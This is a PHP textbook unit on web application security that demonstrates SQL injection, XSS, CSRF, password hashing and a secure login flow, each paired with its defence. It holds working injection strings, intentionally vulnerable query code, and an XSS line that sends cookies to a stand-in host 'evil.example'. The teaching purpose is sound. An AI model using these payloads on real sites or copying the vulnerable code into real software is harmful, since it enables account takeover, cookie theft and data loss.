---
subject: Web Technology II
grade: BCA Semester 4
unit: 7
title: Web Application Security and Authentication
hours: 4
area: BCA 255 · Web Technology II · Unit 7
---

A web application is exposed to the whole Internet, and a login form is attacked within hours of going live. This unit (an addition to the old syllabus, standard in any modern server-side course) shows the most common attacks, each with a working demonstration, and the defence that stops it. The golden rule: **never trust input; escape on output; give users the least privilege.**

::: key What this unit gives you
- SQL injection, demonstrated against a real database, and prepared statements as the cure.
- Cross-site scripting (XSS) and `htmlspecialchars`; cross-site request forgery (CSRF) and tokens.
- Password hashing, a complete registration and login flow, session safety.
:::

## 7.1 SQL injection

If user input is pasted into SQL text, the input can change the structure of the query.

```php
<?php
$db = new PDO("sqlite::memory:", null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$db->exec("CREATE TABLE users (name TEXT, pass TEXT, role TEXT)");
$db->exec("INSERT INTO users VALUES ('admin', 's3cret', 'admin'), ('sita', 'pw1', 'user')");

function login_vulnerable(PDO $db, string $u, string $p): string {
    $sql = "SELECT role FROM users WHERE name = '$u' AND pass = '$p'";     // DANGEROUS
    $r = $db->query($sql)->fetch(PDO::FETCH_ASSOC);
    return $r ? "welcome, role=" . $r["role"] : "denied";
}
function login_safe(PDO $db, string $u, string $p): string {
    $st = $db->prepare("SELECT role FROM users WHERE name = :u AND pass = :p");
    $st->execute([":u" => $u, ":p" => $p]);
    $r = $st->fetch(PDO::FETCH_ASSOC);
    return $r ? "welcome, role=" . $r["role"] : "denied";
}
$attack = "admin' --";                              // everything after -- is a comment
echo "normal      : ", login_vulnerable($db, "sita", "pw1"), "\n";
echo "wrong pass  : ", login_vulnerable($db, "sita", "bad"), "\n";
echo "injection 1 : ", login_vulnerable($db, $attack, "anything"), "\n";
echo "injection 2 : ", login_vulnerable($db, "x", "' OR '1'='1"), "\n";
echo "safe version: ", login_safe($db, $attack, "anything"), " / ", login_safe($db, "x", "' OR '1'='1"), "\n";
echo "the query was: ", "SELECT role FROM users WHERE name = '$attack' AND pass = 'anything'", "\n";
```
```output
normal      : welcome, role=user
wrong pass  : denied
injection 1 : welcome, role=admin
injection 2 : welcome, role=admin
safe version: denied / denied
the query was: SELECT role FROM users WHERE name = 'admin' --' AND pass = 'anything'
```
(The demonstration uses an in-memory SQLite database so that it can be destroyed freely; MySQL behaves identically for these strings, with `-- ` followed by a space as the comment marker.) The attacker logged in as `admin` **without knowing the password**: the comment `--` removed the password check, and `' OR '1'='1` made the condition always true. Worse injections use `UNION SELECT` to read other tables or stacked statements to delete data.

**Defence:** prepared statements for *every* query with variable data (Unit 4); a database account with minimal privileges (no `DROP`, no access to other databases); validate types (cast IDs with `(int)`); generic error messages; keep software patched.

## 7.2 Cross-site scripting (XSS)

XSS happens when an application outputs user-supplied text into HTML without escaping, so the attacker's `<script>` runs in other users' browsers (stealing session cookies, changing the page). Types: **stored** (saved in the database, e.g. a comment), **reflected** (echoed from the URL) and **DOM-based**.

```php
<?php
$comment = '<script>fetch("https://evil.example/?c=" + document.cookie)</script> Nice site <b>!</b>';
echo "UNSAFE : <p>", $comment, "</p>\n";
echo "SAFE   : <p>", htmlspecialchars($comment, ENT_QUOTES | ENT_SUBSTITUTE, "UTF-8"), "</p>\n";
$name = 'x" onmouseover="alert(1)';
echo '<input value="', htmlspecialchars($name, ENT_QUOTES), '">', "\n";
```
```output
UNSAFE : <p><script>fetch("https://evil.example/?c=" + document.cookie)</script> Nice site <b>!</b></p>
SAFE   : <p>&lt;script&gt;fetch(&quot;https://evil.example/?c=&quot; + document.cookie)&lt;/script&gt; Nice site &lt;b&gt;!&lt;/b&gt;</p>
<input value="x&quot; onmouseover=&quot;alert(1)">
```
**Defences:** escape on output with `htmlspecialchars($s, ENT_QUOTES, 'UTF-8')` in HTML text *and* attributes (a different escaping is needed inside JavaScript or URLs: use `json_encode` or `urlencode`); set the cookie flag `HttpOnly` so scripts cannot read the session cookie; send a **Content-Security-Policy** header; in JavaScript use `textContent` rather than `innerHTML`. Escaping on *output* beats trying to filter on input.

## 7.3 Cross-site request forgery (CSRF)

If you are logged in to your bank and visit a malicious page that silently submits a form to the bank's "transfer" URL, the browser attaches your cookie and the bank believes you did it. The defence is a secret, per-session **CSRF token** that the form carries and the server checks.

```php
<?php
ob_start(); session_save_path(sys_get_temp_dir()); session_id("csrf-demo-1"); session_start();
function csrf_token(): string {
    return $_SESSION["csrf"] ??= bin2hex(random_bytes(16));
}
function csrf_check(?string $sent): bool {
    return isset($_SESSION["csrf"]) && is_string($sent) && hash_equals($_SESSION["csrf"], $sent);
}
$token = csrf_token();
echo "token length: ", strlen($token), "\n";
echo "form field: ", '<input type="hidden" name="csrf" value="' . $token . '">', "\n";
echo "legitimate form accepted: ", var_export(csrf_check($token), true), "\n";
echo "forged request (no token): ", var_export(csrf_check(null), true), "\n";
echo "forged request (guessed token): ", var_export(csrf_check(str_repeat("0", 32)), true), "\n";
session_destroy(); ob_end_flush();
```
```output
token length: 32
form field: <input type="hidden" name="csrf" value="d5a6b199479c3403b0a3af4b9dee76fb">
legitimate form accepted: true
forged request (no token): false
forged request (guessed token): false
```
Also use `SameSite=Lax` (or `Strict`) cookies, and perform state-changing actions only with `POST`/`DELETE`, never `GET`.

## 7.4 Passwords: hashing, never encryption

Store only a **salted, slow hash** of the password, never the password. PHP provides `password_hash()` (bcrypt or Argon2 with an automatic random salt) and `password_verify()`.

```php
<?php
$hash = password_hash("nepal123", PASSWORD_BCRYPT, ["cost" => 10]);
echo "hash length: ", strlen($hash), " | starts with: ", substr($hash, 0, 7), "\n";
var_dump(password_verify("nepal123", $hash), password_verify("Nepal123", $hash));
$h2 = password_hash("nepal123", PASSWORD_BCRYPT, ["cost" => 10]);
var_dump($hash === $h2, password_verify("nepal123", $h2));
print_r(password_get_info($hash));
var_dump(password_needs_rehash($hash, PASSWORD_BCRYPT, ["cost" => 12]));
echo md5("nepal123") === md5("nepal123") ? "md5 is the same every time: do NOT use it for passwords\n" : "";
```
```output
hash length: 60 | starts with: $2y$10$
bool(true)
bool(false)
bool(false)
bool(true)
Array
(
    [algo] => 2y
    [algoName] => bcrypt
    [options] => Array
        (
            [cost] => 10
        )

)
bool(true)
md5 is the same every time: do NOT use it for passwords
```
The same password hashes to a **different string each time** (random salt), yet `password_verify` still accepts both. The string contains the algorithm, cost and salt (`$2y$10$…`), 60 characters, so use a `VARCHAR(255)` column. `md5` and `sha1` are fast and unsalted: attackers test billions per second (Operating Systems, Unit 8).

## 7.5 A complete registration and login flow

```php
<?php
ob_start(); session_save_path(sys_get_temp_dir()); session_id("login-demo-1"); session_start();
$db = new PDO("sqlite::memory:", null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]);
$db->exec("CREATE TABLE user (id INTEGER PRIMARY KEY, email TEXT UNIQUE NOT NULL, hash TEXT NOT NULL)");

function register(PDO $db, string $email, string $password): string {
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) return "invalid e-mail";
    if (strlen($password) < 8) return "password too short";
    try {
        $db->prepare("INSERT INTO user (email, hash) VALUES (?, ?)")->execute([$email, password_hash($password, PASSWORD_DEFAULT)]);
        return "registered";
    } catch (PDOException $e) { return "e-mail already registered"; }
}
function login(PDO $db, string $email, string $password): string {
    $st = $db->prepare("SELECT id, hash FROM user WHERE email = ?"); $st->execute([$email]);
    $u = $st->fetch();
    if (!$u || !password_verify($password, $u["hash"])) return "invalid e-mail or password";   // same message for both cases
    session_regenerate_id(true);                        // prevents session fixation
    $_SESSION["user_id"] = $u["id"];
    return "logged in as user " . $u["id"];
}
echo register($db, "sita@tu.edu.np", "nepal2026!"), " | ", register($db, "sita@tu.edu.np", "other-pass"), " | ", register($db, "bad", "12345678"), " | ", register($db, "ram@tu.edu.np", "short"), "\n";
echo login($db, "sita@tu.edu.np", "wrong"), " | ", login($db, "nobody@x.com", "nepal2026!"), " | ", login($db, "sita@tu.edu.np", "nepal2026!"), "\n";
echo "protected page: ", isset($_SESSION["user_id"]) ? "allowed" : "redirect to login", "\n";
$_SESSION = []; session_destroy();
echo "after logout: ", isset($_SESSION["user_id"]) ? "allowed" : "redirect to login", "\n";
ob_end_flush();
```
```output
registered | e-mail already registered | invalid e-mail | password too short
invalid e-mail or password | invalid e-mail or password | logged in as user 1
protected page: allowed
after logout: redirect to login
```
Notes: the same error message for an unknown e-mail and a wrong password avoids revealing which e-mails exist; real systems also **rate-limit** attempts, use HTTPS, and offer password reset by e-mailed one-time link and two-factor authentication.

## 7.6 A security checklist

| Threat | Defence |
|---|---|
| SQL injection | prepared statements, least-privilege DB user |
| XSS | `htmlspecialchars` on output, `HttpOnly` cookies, CSP |
| CSRF | tokens, `SameSite` cookies, `POST` for changes |
| Weak passwords/storage | `password_hash`, minimum length, rate limit, 2FA |
| Session theft/fixation | HTTPS, `session_regenerate_id(true)` at login, `Secure` + `HttpOnly` |
| File upload abuse | check type and content, random name, no execution |
| Path traversal | `basename()`, whitelists |
| Information leaks | `display_errors=Off` in production, log errors |
| Outdated software | patch PHP and libraries; keep dependencies updated (Composer) |

## 7.7 Seeing the ideas: attacks, defences and the three factors

Security is easiest to remember as pictures: where the attacker's text lands inside a query, what an escaped character looks like, who sends the forged request, how a password hash is built and which cookie flags stop which attack. The plate first shows the real objects behind the word "authentication", and the figures show measured results from PHP 8.2.35 (SQLite, bcrypt, sessions and a live `php -S` server).

```photogrid label="7.1" cols="4" ratio="1.0" caption="Locks, keys and the three factors of authentication. (a) A padlock with its keys is the oldest picture of access control: whoever holds the key gets in, which is exactly the weakness of a password that can be copied. (b) A YubiKey hardware security key: something you HAVE, a device that proves possession when plugged in or tapped. (c) Two RSA SecurID tokens, each showing a six-digit one-time code that changes every minute: also something you have. (d) A laptop fingerprint reader board: something you ARE. A strong login combines two of the three factors (something you know, have or are), which is two-factor authentication."
@ photo id="bca255/padlock" cap="Padlock and keys"
fit 1.0
focus 0.55 0.5
@ photo id="bca251/yubikey" cap="Security key: have"
fit 1.0
focus 0.5 0.5
@ photo id="bca251/securid" cap="One-time code token: have"
fit 1.0
focus 0.5 0.5
@ photo id="bca251/fprint" cap="Fingerprint reader: are"
fit 1.0
focus 0.65 0.6
```

```svgfig label="7.1" caption="How SQL injection changes a query, using the real strings of the demonstration above. In case 1 the attacker types admin' -- as the name: the quote closes the string, and the two dashes turn the rest of the query (the password test) into a comment, so the database returns the admin row and the result is welcome, role=admin. In case 2 the password ' OR '1'='1 adds a condition that is always true, so every row matches. In case 3 the query uses placeholders and the values travel separately, so the same text is only a name that does not exist: denied in both attempts."
f = Fig(580, 266)
f.text(8, 14, "Case 1.  Name typed:  admin' --   (any password)", size=11, color=NAVY, bold=True, anchor="start")
f.box(8, 24, 262, 30, "SELECT role FROM users WHERE name = 'admin' ", fill=MINT, stroke=TEAL, size=9.5, anchor="start")
f.box(274, 24, 200, 30, "--' AND pass = 'anything'", fill=SOFT, stroke=SLATE, size=9.5, dash=True)
f.text(480, 39, "comment, ignored", size=9.5, color=SLATE, anchor="start")
f.text(8, 72, "row admin found, password never checked:  welcome, role=admin", size=10.5, color=RED, bold=True, anchor="start")
f.text(8, 98, "Case 2.  Password typed:  ' OR '1'='1", size=11, color=NAVY, bold=True, anchor="start")
f.box(8, 108, 270, 30, "... WHERE name = 'x' AND pass = ''", fill=MINT, stroke=TEAL, size=9.5, anchor="start")
f.box(282, 108, 150, 30, "OR '1'='1'", fill=SAND, stroke=AMBER, size=10, bold=True)
f.text(438, 123, "always true", size=9.5, color=AMBER, bold=True, anchor="start")
f.text(8, 156, "every row matches:  welcome, role=admin", size=10.5, color=RED, bold=True, anchor="start")
f.text(8, 184, "Case 3.  Prepared statement: query and values travel separately", size=11, color=NAVY, bold=True, anchor="start")
f.box(8, 194, 270, 30, "WHERE name = :u AND pass = :p", fill=MINT, stroke=TEAL, size=9.5, anchor="start")
f.box(282, 194, 290, 30, "u = \"admin' --\"     p = \"anything\"", fill=BLUE, stroke=NAVY, size=9.5)
f.text(8, 246, "plain text only, no such user exists:  denied  /  denied", size=10.5, color=TEAL, bold=True, anchor="start")
```

```svgfig label="7.2" caption="What htmlspecialchars writes for the five dangerous characters (real PHP 8.2.35 output with ENT_QUOTES). The browser shows the entity as the character but never treats it as markup. On the right, the hostile name x followed by a double quote and onmouseover=alert(1) is typed into a form: echoed raw, the quote ends the value attribute and a new attribute appears; escaped, the quotes become &quot; and the text stays inside the value. The flag matters: the older ENT_COMPAT setting escapes double quotes only, so a single quote stays unchanged."
f = Fig(580, 232)
f.box(8, 8, 100, 26, "Character", fill=BLUE, stroke=NAVY, size=11, bold=True, r=3)
f.box(112, 8, 130, 26, "Written as", fill=BLUE, stroke=NAVY, size=11, bold=True, r=3)
for i, (a, b) in enumerate([("&", "&amp;"), ("<", "&lt;"), (">", "&gt;"), ("\"", "&quot;"), ("'", "&#039;")]):
    y = 38 + i * 30
    f.box(8, y, 100, 26, a, fill=SOFT, stroke=SLATE, size=13, bold=True, r=3)
    f.box(112, y, 130, 26, b, fill=MINT, stroke=TEAL, size=12, bold=True, r=3)
f.text(8, 206, "ENT_COMPAT leaves the single quote alone:", size=10, color=RED, bold=True, anchor="start")
f.text(8, 222, "use ENT_QUOTES for text and attributes", size=10, color=RED, anchor="start")
f.text(262, 16, "Hostile name typed into a form", size=11, color=NAVY, bold=True, anchor="start")
f.box(262, 26, 310, 28, "x\" onmouseover=\"alert(1)", fill=SAND, stroke=AMBER, size=10)
f.text(262, 74, "echoed raw: the quote closes the attribute", size=10.5, color=RED, bold=True, anchor="start")
f.box(262, 82, 310, 28, "<input value=\"x\" onmouseover=\"alert(1)\">", fill=ROSE, stroke=RED, size=9)
f.text(262, 130, "escaped with ENT_QUOTES", size=10.5, color=TEAL, bold=True, anchor="start")
f.box(262, 138, 310, 28, "<input value=\"x&quot; onmouseover=&quot;alert(1)\">", fill=MINT, stroke=TEAL, size=9)
f.text(262, 186, "the browser shows text and runs nothing", size=10.5, color=TEAL, bold=True, anchor="start")
```

```svgfig label="7.3" caption="A cross-site request forgery and its cure. (1) The victim logs in to the bank and the browser stores the session cookie. (2) The victim opens another page that hides a form aimed at the bank. (3) The browser submits it and attaches the bank's cookie automatically, so the bank sees a logged-in user. The defence is a secret token that only the real form contains. In the real run the token was 32 hexadecimal characters; the legitimate form was accepted (true), while a request without a token and one with a guessed token of 32 zeros were both refused (false)."
f = Fig(580, 300)
f.box(8, 8, 142, 30, "Bank (PHP)", fill=BLUE, stroke=NAVY, size=11, bold=True)
f.box(219, 8, 142, 30, "Victim's browser", fill=SAND, stroke=AMBER, size=11, bold=True)
f.box(430, 8, 142, 30, "Evil page", fill=ROSE, stroke=RED, size=11, bold=True)
for x in (79, 290, 501):
    f.line(x, 38, x, 214, color="#cbd5e1", sw=1.2, dash=True)
f.arrow([(80, 78), (289, 78)], color=NAVY, both=True, label="1  log in, cookie is set", lpos=(185, 70), lsize=9.5)
f.arrow([(291, 120), (500, 120)], color=AMBER, label="2  opens the evil page", lpos=(396, 112), lsize=9.5)
f.arrow([(500, 150), (291, 150)], color=RED, label="hidden form aimed at the bank", lpos=(396, 142), lsize=9)
f.arrow([(289, 190), (80, 190)], color=RED, label="3  forged POST + cookie", lpos=(185, 182), lsize=9.5)
f.box(8, 228, 280, 62, "no token or a guessed token:\ncsrf_check gives false,\nthe bank refuses the request", fill=MINT, stroke=TEAL, size=10)
f.box(300, 228, 272, 62, "real form carries a hidden token\n(32 hex characters):\nhash_equals gives true", fill=BLUE, stroke=NAVY, size=10)
```

```svgfig label="7.4" caption="Anatomy and cost of a bcrypt hash (real values measured on one PHP 8.2.35 process). The 60-character string holds the algorithm and cost (7 characters, bcrypt 2y with cost 10), a random salt (22 characters) and the hash itself (31 characters), drawn to scale, so one VARCHAR(255) column is enough and the salt needs no separate column. Speed is the point of a password hash: md5 reached 7,663,699 guesses per second, while bcrypt at cost 10 allowed 21 per second, about 365 thousand times fewer. Each increase of the cost by 2 makes one hash four times slower: 12 ms, 48 ms and 192 ms."
f = Fig(580, 262)
f.box(8, 8, 63, 32, "$2y$10$", fill=SAND, stroke=AMBER, size=10, bold=True)
f.box(71, 8, 198, 32, "salt: 22 characters", fill=BLUE, stroke=NAVY, size=11, bold=True)
f.box(269, 8, 279, 32, "hash: 31 characters", fill=MINT, stroke=TEAL, size=11, bold=True)
f.text(8, 56, "algorithm + cost", size=9.5, color=AMBER, anchor="start")
f.text(278, 56, "total 60 characters (VARCHAR 255 is enough)", size=10, color=SLATE, anchor="start")
f.text(8, 92, "Guesses per second on one process (measured)", size=11, color=NAVY, bold=True, anchor="start")
f.box(8, 102, 540, 28, "md5:  7,663,699 per second", fill=ROSE, stroke=RED, size=11, bold=True)
f.box(8, 140, 3, 28, "", fill=TEAL, stroke=TEAL, r=1)
f.text(20, 155, "bcrypt cost 10:  21 per second  (about 365 thousand times fewer)", size=10.5, color=TEAL, bold=True, anchor="start")
f.text(8, 196, "Time for one bcrypt hash: each +2 in cost is 4 times slower", size=11, color=NAVY, bold=True, anchor="start")
for i, (c, ms) in enumerate([(8, 12), (10, 48), (12, 192)]):
    x = 8 + i * 184
    f.box(x, 208, 172, 40, "cost %d\n%d ms" % (c, ms), fill=MINT if c == 10 else SOFT, stroke=TEAL if c == 10 else SLATE, size=11, bold=True)
```

```svgfig label="7.5" caption="Cookie flags measured on a live PHP server. The real response header was Set-Cookie: PHPSESSID=(id); path=/; HttpOnly; SameSite=Lax. HttpOnly hides the cookie from JavaScript, so an XSS script cannot read the session id. SameSite=Lax stops the browser from sending the cookie with a cross-site POST, which blocks most forged requests. The Secure flag (HTTPS only) was not in this plain-HTTP test and must be added on a real site. After login, session_regenerate_id(true) gave a new id of the same 26-character length (differ = true), which defeats session fixation."
f = Fig(580, 214)
f.box(8, 8, 564, 30, "Set-Cookie: PHPSESSID=(id); path=/; HttpOnly; SameSite=Lax", fill=SOFT, stroke=SLATE, size=11, bold=True)
f.box(8, 52, 182, 80, "HttpOnly\nJavaScript cannot read\nthe cookie, so XSS cannot\nsteal the session id", fill=MINT, stroke=TEAL, size=10)
f.box(199, 52, 182, 80, "SameSite=Lax\nnot sent with a cross-site\nPOST, so most forged\nrequests fail", fill=BLUE, stroke=NAVY, size=10)
f.box(390, 52, 182, 80, "Secure (add on HTTPS)\ncookie travels only over\nHTTPS; absent in this\nplain-HTTP test", fill=SAND, stroke=AMBER, size=10)
f.box(8, 148, 564, 52, "after login: session_regenerate_id(true)\nold id and new id differ (both 26 characters), so an id planted\nbefore login is useless: this stops session fixation", fill=MINT, stroke=TEAL, size=10)
```

```svgfig label="7.6" caption="The layers a login request passes, in order, with the real messages of the registration and login run. Each layer stops one attack: HTTPS stops eavesdropping, the CSRF token stops forged forms, validation stops bad input, the prepared query stops SQL injection, password_verify keeps the plain password out of the database, and regenerating the session id stops fixation. In the run a wrong password and an unknown e-mail both returned the same text, invalid e-mail or password, so an attacker cannot learn which e-mails exist; the correct login returned logged in as user 1, and after logout the protected page redirected to login."
f = Fig(580, 196)
boxes = [("1  HTTPS page,\nform with hidden\nCSRF token", 8), ("2  CSRF check and\nvalidation\n(filter_var)", 205), ("3  prepared SELECT\nby e-mail\n(no injection)", 402)]
for t, x in boxes:
    f.box(x, 10, 170, 46, t, fill=BLUE, stroke=NAVY, size=10)
f.arrow([(178, 33), (205, 33)], color=SLATE)
f.arrow([(375, 33), (402, 33)], color=SLATE)
f.arrow([(487, 56), (487, 78), (93, 78), (93, 100)], color=SLATE)
boxes2 = [("4  password_verify\nagainst the stored\nbcrypt hash", 8), ("5  regenerate session id,\nstore user_id", 205), ("6  protected page:\nallowed; after logout:\nredirect to login", 402)]
for t, x in boxes2:
    f.box(x, 100, 170, 46, t, fill=MINT, stroke=TEAL, size=10)
f.arrow([(178, 123), (205, 123)], color=SLATE)
f.arrow([(375, 123), (402, 123)], color=SLATE)
f.text(8, 172, "real run: wrong password and unknown e-mail both say 'invalid e-mail or password'", size=10, color=NAVY, bold=True, anchor="start")
f.text(8, 188, "correct login: 'logged in as user 1'", size=10, color=TEAL, bold=True, anchor="start")
```

### 7.7.1 Eight rules for a secure PHP web application

1. **Never trust input.** Everything from `$_GET`, `$_POST`, cookies, headers and uploaded files can be changed by an attacker. Check type, length and format, for example with `filter_var`, before using it. A result portal that accepts a symbol number should accept only digits.
2. **Use prepared statements for every query.** Placeholders keep the query and the values apart, so `admin' --` stays plain text (Fig. 7.1). Never join user text into SQL, even for an internal page. A college fee system that searches by student name needs this as much as a bank.
3. **Escape every output.** Use `htmlspecialchars($s, ENT_QUOTES, 'UTF-8')` when you print user text into HTML (Fig. 7.2). A stored comment on a notice board then displays as text and cannot run a script. Use `json_encode` when the value goes into JavaScript.
4. **Protect state-changing forms with a CSRF token.** Put a random token in each form and check it with `hash_equals` (Fig. 7.3). Also change data only with `POST` or `DELETE`, never with a link. This protects actions such as transferring money in an e-banking page or changing a phone number in a portal.
5. **Hash passwords with `password_hash`.** Store only the 60-character bcrypt string and test with `password_verify` (Fig. 7.4). Never store the plain password or an unsalted md5. If the database leaks, the attacker still needs about 48 ms for every single guess.
6. **Use HTTPS and safe cookies.** HTTPS stops people on shared Wi-Fi from reading logins. Set `HttpOnly`, `Secure` and `SameSite=Lax` on the session cookie and regenerate the session id after login (Fig. 7.5). Services such as ConnectIPS and the Nagarik App are only trusted because the connection is encrypted.
7. **Give the least privilege and hide the details.** The web application's database user should not be able to `DROP` tables or read other databases. Turn `display_errors` off in production and log errors privately. A visible database error tells an attacker the table and column names.
8. **Add rate limits, second factors and updates.** Slow down or lock an account after a few failed logins, offer two-factor login with an app code or hardware key (Plate 7.1), and keep PHP and libraries patched. Every login layer in Fig. 7.6 can fail, so no single check should be the only protection. Regular updates close the holes that are already public.

## Formula and fact sheet

- Injection cure: prepared statements. XSS cure: `htmlspecialchars($s, ENT_QUOTES, "UTF-8")`.
- CSRF token: `bin2hex(random_bytes(16))` in the session and a hidden field, compared with `hash_equals`.
- Passwords: `password_hash` / `password_verify` (60-character bcrypt string, random salt).
- Login: `session_regenerate_id(true)`, generic error message, HTTPS.

## Chapter summary

- Injection, XSS and CSRF all come from trusting input; each has a standard defence.
- Passwords are stored as slow salted hashes; the login flow regenerates the session ID and reveals nothing about which part failed.
- Security is a checklist applied to every form, query and output, not a feature added at the end.

## Practice

1. Explain SQL injection with the string `' OR '1'='1` and give the fix.
2. What is stored XSS? Write the PHP statement that prevents it for a comment.
3. How does a CSRF token stop a forged request?
4. Why is `md5($password)` unsuitable for storing passwords?
5. Write registration and login functions using `password_hash` and `password_verify`.
6. Why should the login error message be the same for a wrong e-mail and a wrong password?
7. What does `session_regenerate_id(true)` protect against?

::: note Answers and worked solutions
**1.** In `... WHERE pass = '$p'`, the input `' OR '1'='1` turns the condition into `pass = '' OR '1'='1'`, always true, so login succeeds (Section 7.1 shows it). Fix: prepared statements.
**2.** Stored XSS: an attacker saves a comment containing `<script>`; it runs in every visitor's browser. Prevent it with `echo htmlspecialchars($comment, ENT_QUOTES, "UTF-8");` on output.
**3.** The server accepts a state-changing request only if it carries the secret token stored in the user's session. A forged request from another site cannot read or guess the token, so the check fails.
**4.** `md5` is fast and unsalted: billions of guesses per second, identical passwords give identical hashes (rainbow tables). `password_hash` is slow, salted and adjustable in cost.
**5.** See `register()` and `login()` in Section 7.5.
**6.** Different messages tell an attacker which e-mails are registered (**user enumeration**); one generic message reveals nothing.
**7.** **Session fixation**: an attacker plants a known session ID in the victim's browser before login; regenerating the ID at login makes the planted ID worthless.
:::

## Model answers (5 and 10 marks)

**Q1. What is SQL injection? Explain how it works with an example, its effects, and how to prevent it in PHP. (10 marks)**

**Introduction.** SQL injection is an attack in which the user's input is pasted into an SQL statement and changes the *structure* of the query instead of being treated as data. It is one of the most common web vulnerabilities and appears on the OWASP list of top risks year after year. It happens when a programmer builds SQL with string joining, as in Fig. 7.1.

**How it works.** Suppose the login code is `SELECT role FROM users WHERE name = '$u' AND pass = '$p'`. If the user types `admin' --` as the name, the quote closes the string and `--` starts a comment, so the password test disappears and the admin row is returned. If the password is `' OR '1'='1`, the condition becomes always true and every row matches. In the demonstration of Section 7.1, both attacks produced `welcome, role=admin` without any password.

**Effects.**

1. **Login bypass:** the attacker enters as another user, even an administrator.
2. **Data theft:** a `UNION SELECT` can read other tables such as users or marks.
3. **Data change or loss:** `UPDATE` or `DELETE` can be injected; the program below shows a delete that wipes a whole table.
4. **Server damage:** with a powerful database account the attacker may drop tables or read files.

The next program was run for real. The vulnerable delete is given the name `x' OR '1'='1`, and the safe version gets the same text.

```php
<?php
$db = new PDO("sqlite::memory:", null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$db->exec("CREATE TABLE student (name TEXT)");
$db->exec("INSERT INTO student VALUES ('Sita'), ('Ram'), ('Hari')");
$evil = "x' OR '1'='1";
$n = $db->exec("DELETE FROM student WHERE name = '$evil'");          // vulnerable
echo "vulnerable delete removed ", $n, " rows, left ", $db->query("SELECT COUNT(*) FROM student")->fetchColumn(), "\n";
$db->exec("INSERT INTO student VALUES ('Sita'), ('Ram'), ('Hari')");
$st = $db->prepare("DELETE FROM student WHERE name = :n");           // safe
$st->execute([":n" => $evil]);
echo "prepared delete removed ", $st->rowCount(), " rows, left ", $db->query("SELECT COUNT(*) FROM student")->fetchColumn(), "\n";
```
```output
vulnerable delete removed 3 rows, left 0
prepared delete removed 0 rows, left 3
```
**Prevention.**

| Defence | How it helps |
|---|---|
| Prepared statements with bound values | Query and data travel separately, so input cannot become SQL |
| Least-privilege database user | Even a successful injection cannot `DROP` tables or reach other databases |
| Validation and casting (`(int)$id`) | Rejects input that does not have the expected type or format |
| Generic error messages | Hides table and column names from the attacker |
| Patching and code review | Removes known weaknesses and string-built queries |

**Conclusion.** SQL injection exists only because data is mixed with code. Prepared statements remove the mixing completely, and the other defences limit the damage if one query is missed. Every query that contains a variable must therefore be prepared.

**Q2. What is cross-site scripting (XSS)? Name its types and explain how PHP prevents it. (5 marks)**

**Cross-site scripting** happens when a web application prints user-supplied text into a page without escaping it, so the attacker's `<script>` runs in the browsers of *other* users. The script can read the session cookie, change the page, redirect the user or send forms in the user's name. The attack uses the trust that the browser has in the site.

**Types.**

1. **Stored XSS:** the script is saved in the database, for example in a comment, and runs for every visitor.
2. **Reflected XSS:** the script is in a link or query string and the page echoes it back at once.
3. **DOM-based XSS:** client-side JavaScript writes untrusted data into the page with `innerHTML`.

**Prevention in PHP.** Escape on output with `htmlspecialchars($text, ENT_QUOTES, 'UTF-8')`. As Fig. 7.2 shows, the characters `& < > " '` become entities, so the browser displays them and does not run them. Use `json_encode` for values put into JavaScript and `urlencode` for URLs. Set the cookie flag `HttpOnly` so scripts cannot read the session cookie (Fig. 7.5), and send a `Content-Security-Policy` header that allows scripts only from your own site. In JavaScript use `textContent` and not `innerHTML`.

**Example.** A comment `<script>steal()</script>` is shown on screen as plain text after escaping, and nothing runs.

**Q3. Design a secure registration and login system in PHP. Explain each security measure and show the program. (10 marks)**

**Introduction.** A login system protects accounts, so it must resist guessing, injection, forged requests and stolen sessions. The design in Fig. 7.6 puts several independent layers in a row, so that one weak point does not break the whole system. The same ideas are used by any Nepali portal that holds personal data, such as a university result or a government service.

**Measures, step by step.**

1. **Validate input.** Check the e-mail with `filter_var(..., FILTER_VALIDATE_EMAIL)` and require a minimum password length (8 characters).
2. **Hash the password.** Store `password_hash($password, PASSWORD_DEFAULT)`, a salted slow hash of 60 characters, never the password (Fig. 7.4).
3. **Prepared statements.** Insert and select with placeholders, so the form cannot inject SQL.
4. **Unique e-mail.** A `UNIQUE` constraint rejects duplicates; the program turns the error into a clear message.
5. **Same error for both failures.** An unknown e-mail and a wrong password both give `invalid e-mail or password`, so attackers cannot find out which e-mails exist.
6. **Limit attempts.** After three failed attempts the account is locked for a time; this stops automatic guessing.
7. **Safe session.** Call `session_regenerate_id(true)` after login, set `HttpOnly` and `SameSite=Lax` (Fig. 7.5), and use a CSRF token in every form (Fig. 7.3).
8. **HTTPS and logout.** Serve the site over HTTPS and destroy the session on logout.

**Program (real run).**

```php
<?php
$db = new PDO("sqlite::memory:", null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]);
$db->exec("CREATE TABLE user (email TEXT UNIQUE NOT NULL, hash TEXT NOT NULL, fails INTEGER NOT NULL DEFAULT 0)");
function register(PDO $db, string $e, string $p): string {
    if (!filter_var($e, FILTER_VALIDATE_EMAIL) || strlen($p) < 8) return "rejected";
    try { $db->prepare("INSERT INTO user (email, hash) VALUES (?, ?)")->execute([$e, password_hash($p, PASSWORD_DEFAULT)]); return "registered"; }
    catch (PDOException $x) { return "already exists"; }
}
function login(PDO $db, string $e, string $p): string {
    $st = $db->prepare("SELECT hash, fails FROM user WHERE email = ?"); $st->execute([$e]); $u = $st->fetch();
    if ($u && $u["fails"] >= 3) return "locked";
    if (!$u || !password_verify($p, $u["hash"])) {
        $db->prepare("UPDATE user SET fails = fails + 1 WHERE email = ?")->execute([$e]);
        return "invalid e-mail or password";
    }
    $db->prepare("UPDATE user SET fails = 0 WHERE email = ?")->execute([$e]);
    return "welcome";
}
echo register($db, "sita@tu.edu.np", "nepal2026!"), ", ", register($db, "sita@tu.edu.np", "nepal2026!"), ", ", register($db, "bad", "12345678"), "\n";
foreach (["a", "b", "c", "nepal2026!"] as $try) echo login($db, "sita@tu.edu.np", $try), " | ";
echo login($db, "nobody@x.com", "x"), "\n";
```
```output
registered, already exists, rejected
invalid e-mail or password | invalid e-mail or password | invalid e-mail or password | locked | invalid e-mail or password
```
